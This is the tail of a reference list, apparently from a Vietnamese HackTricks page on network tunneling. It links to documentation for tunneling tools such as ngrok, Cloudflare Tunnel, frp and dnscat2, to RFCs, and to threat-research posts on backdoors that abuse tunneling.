- [33] [README của dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README của proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Tên miền – Triển khai và đặc tả](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README của ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI của ngrok Agent](https://ngrok.com/docs/agent/cli)
- [40] [Giao diện kiểm tra web của ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Virtual host của ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Cấu hình ngrok Agent v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Tổng quan về Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Các tham số origin của Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Thiết lập Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Tệp cấu hình Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Các tham số chạy Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Các khái niệm về frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP của frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [Cổng SSH Tunnel của frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Tài liệu mạng QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README của wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Kho mã nguồn BOFScale của NetSPI](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: Tailnet được CDN đứng trước từ BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Các lệnh CLI của Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [APT NightEagle: GhostContainer và tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - Backdoor Linux ClingSTUN lạm dụng hạ tầng STUN công khai](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - Tiện ích duyệt NAT cho phiên (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Yêu cầu về hành vi NAT cho UDP unicast](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [README của Tailcat](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Malware Kothamine dùng tailcat của Tailscale để né tránh phát hiện mạng](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
- [64] [README của Yggstack](https://github.com/yggdrasil-network/yggstack)
- [65] [Cấu hình Yggdrasil: kết nối với các peer](https://yggdrasil-network.github.io/configuration.html)
- [66] [Câu hỏi thường gặp về Yggdrasil: tính ẩn danh và peering](https://yggdrasil-network.github.io/faq.html)
- [67] [ESET Research: Backdoor MythicRatatoskr hỗ trợ Yggdrasil](https://www.welivesecurity.com/en/eset-research/mythicratatoskr-yggdrasil-enabled-backdoor-deployed-uac0099-sandworm-collaboration)
{{#include ../banners/hacktricks-training.md}}
